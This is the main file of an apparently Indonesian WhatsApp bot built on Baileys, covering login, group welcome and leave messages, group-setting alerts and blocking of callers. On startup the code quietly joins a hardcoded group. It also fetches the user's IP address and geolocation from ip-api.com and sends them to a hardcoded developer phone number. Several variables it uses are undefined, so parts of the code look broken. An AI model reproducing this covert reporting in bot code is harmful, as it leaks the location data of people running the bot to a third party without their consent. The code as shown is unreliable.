const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const denz = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
denz.autoReconnect = ReconnectMode.onConnectionLost
    denz.version = [2, 2143, 3]
    denz.logger.level = 'warn'
    denz.browserDescription = ['Bagus Bot','Desktop','3.0']
    await sleep(10000)
    denz.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan this QR code', 'cyan'))
    })
    fs.existsSync('./QRnya.json') && denz.loadAuthInfo('./QRnya.json')
    
    denz.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
        })
     
      await denz.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/yntkts`
 denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
 denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Terhubung",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285335144197?text=makasih+scnya+bang"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       denz.sendMessage("6285335144197@s.whatsapp.net", `Ijin Make Bot nya kak\n\n────────────────────\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "IP-USER",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx"}}})
     console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
   })
      
    denz.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
		})
	
	denz.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'cyan'))
	}) 
     
    denz.on('ws-close', () => {
        console.log(color('|TRM|'), color('Connection lost, trying to reconnect.', 'cyan'))
        })
    
    denz.on('close', async () => {
        console.log(color('|TRM|'), color('Disconnected.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}

//Const 
			try {
			ppimg = await denz.getProfilePicture(`${num.split('@')[0]}@c.us`)
			} catch {
			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
			}
			const ofrply = await getBuffer(ppimg)
			const finvwel = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `Bagus`,
			"groupName": `Bot`, 
            "caption": `Welcome`, 
            'jpegThumbnail': ofrply
		}
	}
}
const finvlev = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `Bagus`,
			"groupName": `Bot`, 
            "caption": `Leaving`, 
            'jpegThumbnail': ofrply
		}
	}
}
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await denz.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
denz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

const reply = (teks) => {
			denz.sendMessage(from, teks, text, { thumbnail: dfrply, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jmn} - ${week} ${weton} - ${calender}`,body:"",previewType:"PHOTO",thumbnail:ofrply,sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
		}
		const textreply = (teks) => {
			denz.sendMessage(from, teks, text, {quoted:mek})
		}

try {
		pporang = await denz.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ppku = await getBuffer(pporang)
   
   denz.on('chat-update', async (mek) => {
        require('./denz.js')(denz, mek)
        ownerNumber = ["6285335144197@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "0@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
	denz.on('group-participants-update', async (anu) => {
		const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
	    const isWelcome = welkom.includes(anu.jid)
	    if (!isWelcome) return
           mem = anu.participants[0]
		       mdata = await denz.groupMetadata(anu.jid)
                memeg = mdata.participants.length
            	num = anu.participants[0]
                let v = denz.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = v.vname || v.notify || num.split('@')[0]
		    try {
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
		    num = anu.participants[0]
			try {
        ppimg = await denz.getProfilePicture(mem);
      } catch (e) {
        ppimg =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
			try {
                pp_grup = await denz.getProfilePicture(anu.jid)
                } catch {
                pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
			teks = `*Halo* @${num.split('@')[0]}\nSelamat datang di group *${mdata.subject}*
			
Nama:
Umur:
Gender:
Askot:

Pahami rules grup ya kak!`
			let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/welcome?nama=${anu_user}&descriminator=${memeg}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&pp=${ppimg}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`)
			const welbutton = await denz.prepareMessage(mdata.id, buff, MessageType.image, ) // change for file type
const buttonssss = [
  {buttonId: 'wel', buttonText: {displayText: 'Halo'}, type: 1}
]
const buttonWel = {
    contentText: teks,
    buttons: buttonssss,
    footerText: 'Semoga Betah ~',
    headerType: 4, // change for file type
    imageMessage: welbutton.message.imageMessage // change for file type
}
denz.sendMessage(mdata.id, buttonWel, MessageType.buttonsMessage, {contextInfo: {"mentionedJid": [num]}, quoted: finvwel})
			} else if (anu.action == 'remove') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
			num = anu.participants[0]
			mdata = await denz.groupMetadata(anu.jid)
                memeg = mdata.participants.length
            	num = anu.participants[0]
                let w = denz.contacts[num] || { notify: num.replace(/@.+/, '') }
                anu_user = w.vname || w.notify || num.split('@')[0]
			try {
        ppimg = await denz.getProfilePicture(mem);
      } catch (e) {
        ppimg =
          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
      }
			try {
                pp_grup = await denz.getProfilePicture(anu.jid)
                } catch {
                pp_grup = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
			let buff = await getBuffer(`http://hadi-api.herokuapp.com/api/card/goodbye?nama=${anu_user}&descriminator=${memeg}&memcount=${memeg}&gcname=${encodeURI(mdata.subject)}&pp=${ppimg}&bg=https://i.postimg.cc/rFkw8MpX/IMG-20210807-151325.jpg`)
			out =`*Selamat tinggal* @${num.split('@')[0]}\nSemoga tenang di alam sana!`
            const lefbutton = await denz.prepareMessage(mdata.id, buff, MessageType.image, ) // change for file type
const buttonsss = [
  {buttonId: 'leavegc', buttonText: {displayText: 'Byee'}, type: 1}
]
const buttonLef = {
    contentText: out,
    buttons: buttonsss,
    footerText: 'Gosah Balik Lu Ajg !',
    headerType: 4, // change for file type
    imageMessage: lefbutton.message.imageMessage // change for file type
}
denz.sendMessage(mdata.id, buttonLef, MessageType.buttonsMessage, {contextInfo: {"mentionedJid": [num]}, quoted: finvlev})
			} else if (anu.action == 'promote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '0@s.whatsapp.net' } : {})}, message: { "contactMessage":{"displayName": `Congrats 🔥`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*DEMOTE DETECT*\n\nNomor : @${num.split('@')[0]}\nGroup : ${mdata.subject}\nPesan : selamat sekarang anda menjadi admin grup!`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}})
console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
} 
else if (anu.action == 'demote') {
fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '0@s.whatsapp.net' } : {})}, message: { "contactMessage":{"displayName": `Kasian di demote`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
num = anu.participants[0]
teks = `*DEMOTE DETECT*\n\nNomor : @${num.split('@')[0]}\nGroup : ${mdata.subject}\nPesan : awokawok di demote`
denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}})
console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	denz.on('group-update', async (anu) => {
		const metdata = await denz.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '0@s.whatsapp.net' } : {})}, message: { "contactMessage":{"displayName": ``,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;denz;;;\nFN:denz\nitem1.TEL;waid=6282252509320:6282252509320\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
    denz.sendMessage(metdata.id, teks, MessageType.text)
    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
    denz.sendMessage(metdata.id, teks, MessageType.text)
    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}})
    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Group Setting Change ] -\n\n_Edit info Group telah dibuka untuk member_\n_Sekarang semua member dapat mengedit info Group Ini_`
    denz.sendMessage(metdata.id, teks, MessageType.text)
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Group Setting Change ] -\n\n_Edit info Group telah ditutup untuk member_\n_Sekarang hanya admin group yang dapat mengedit info Group Ini_`
    denz.sendMessage(metdata.id, teks, MessageType.text)
    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
  }
})

denz.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
        denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
        await sleep(5000)
        await denz.blockUser(callerId, "add")
        })
        
	denz.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = denz.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = denz.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()